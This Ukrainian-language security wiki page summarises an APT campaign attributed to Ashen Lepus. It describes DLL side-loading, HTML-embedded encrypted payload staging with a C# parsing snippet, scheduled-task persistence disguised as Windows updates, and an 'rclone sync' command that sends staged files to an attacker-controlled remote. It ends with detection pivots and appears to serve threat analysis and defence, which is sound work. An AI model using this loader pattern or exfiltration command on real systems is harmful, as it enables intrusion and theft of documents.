# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) застосував відтворюваний шаблон, який поєднує DLL sideloading, staged HTML payloads та modular .NET backdoors для збереження присутності в дипломатичних мережах Близького Сходу. Техніка повторно використовувана будь-яким оператором, оскільки спирається на:

- **Archive-based social engineering**: невинні PDFs інструктують цілі завантажити RAR-архів із файлообмінного сайту. Архів містить реалістичний переглядач документів EXE, шкідливу DLL з іменем довіреної бібліотеки (наприклад, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) та приманку `Document.pdf`.
- **DLL search order abuse**: жертва двічі клацає EXE, Windows вирішує імпорт DLL з поточного каталогу, і шкідливий лоадер (AshenLoader) виконується в складі довіреного процесу, поки приманка PDF відкривається, щоб не викликати підозр.
- **Living-off-the-land staging**: кожен наступний етап (AshenStager → AshenOrchestrator → modules) зберігається поза диском до моменту потреби й доставляється як зашифровані блоби, приховані всередині на перший погляд безпечних HTML-відповідей.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: EXE підвантажує AshenLoader, який виконує host recon, шифрує його AES-CTR і POST-ить його в обертових параметрах, таких як `token=`, `id=`, `q=` або `auth=`, до шляхів, схожих на API (наприклад, `/api/v2/account`).
2. **HTML extraction**: C2 розкриває наступний етап лише тоді, коли IP клієнта геолокалізується в цільовому регіоні і `User-Agent` відповідає імпланту, що ускладнює роботу sandboxes. Коли перевірки пройдені, тіло HTTP містить `<headerp>...</headerp>` blob з Base64/AES-CTR зашифрованим AshenStager payload.
3. **Second sideload**: AshenStager розгортається разом з іншим легітимним бінаром, який імпортує `wtsapi32.dll`. Шкідлива копія, інжектована в бінар, отримує більше HTML і цього разу вирізає `<article>...</article>` щоб відновити AshenOrchestrator.
4. **AshenOrchestrator**: модульний .NET контролер, який декодує Base64 JSON конфіг. Поля `tg` і `au` конфігу конкатенуються/хешуються у AES-ключ, який дешифрує `xrk`. Отримані байти служать як XOR-ключ для кожного модульного блоба, що завантажується далі.
5. **Module delivery**: кожен модуль описаний через HTML-коментарі, що перенаправляють парсер до довільного тегу, порушуючи статичні правила, які шукають лише `<headerp>` або `<article>`. Модулі включають persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) та file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Навіть якщо захисники блокують або видаляють конкретний елемент, оператору потрібно лише змінити тег, вказаний у HTML-коментарі, щоб відновити доставку.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: поточні loaders вбудовують 256-бітні ключі та nonces (наприклад, `{9a 20 51 98 ...}`) і опційно додають XOR-шар, використовуючи рядки типу `msasn1.dll` до/після дешифрування.
- **Recon smuggling**: перераховані дані тепер включають списки Program Files для виявлення цінних додатків і завжди шифруються перед відправкою з хоста.
- **URI churn**: параметри запиту та REST-шляхи змінюються між кампаніями (`/api/v1/account?token=` → `/api/v2/account?auth=`), що робить крихкими статичні сигнатури.
- **Gated delivery**: сервери обмежені гео-фільтрацією і відповідають тільки реальним implants. Невідомі клієнти отримують нешкідливий HTML.

## Persistence & Execution Loop

AshenStager створює заплановані завдання, які маскуються під завдання обслуговування Windows і виконуються через `svchost.exe`, наприклад:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ці завдання знову запускають sideloading-ланцюг під час завантаження або за інтервалами, забезпечуючи, що AshenOrchestrator може запитувати нові модулі без повторного запису на диск.

## Using Benign Sync Clients for Exfiltration

Оператори підкладають дипломатичні документи в `C:\Users\Public` (доступні для читання всіма і не підозрілі) через спеціальний модуль, потім завантажують легітимний [Rclone](https://rclone.org/) бінарний файл, щоб синхронізувати цей каталог зі сховищем, контрольованим атакуючими:

1. **Stage**: скопіювати/зібрати цільові файли в `C:\Users\Public\{campaign}\`.
2. **Configure**: розгорнути конфігурацію Rclone, що вказує на HTTPS-ендпоінт, контрольований атакуючими (наприклад, `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Оскільки Rclone широко використовується для легітимних резервних процесів, захисникам слід зосередитися на аномальних виконаннях (нові бінарні файли, підозрілі remotes або раптове синхронізування `C:\Users\Public`).

## Detection Pivots

- Сповіщати про **signed processes**, які несподівано завантажують DLL з шляхів, доступних для запису користувачем (Procmon filters + `Get-ProcessMitigation -Module`), особливо коли імена DLL перетинаються з `netutils`, `srvcli`, `dwampi`, або `wtsapi32`.
- Перевіряти підозрілі HTTPS-відповіді на предмет **великих Base64 блобів, вбудованих у незвичні теги** або захищених коментарями `<!-- TAG: <xyz> -->`.
- Шукати **scheduled tasks**, що запускають `svchost.exe` з аргументами, непритаманними службам, або вказують на каталоги дропперів.
- Моніторити появу бінарників **Rclone** поза місцями, якими керує IT, нових файлів `rclone.conf` або задач синхронізації, що тягнуть з тимчасових директорій типу `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
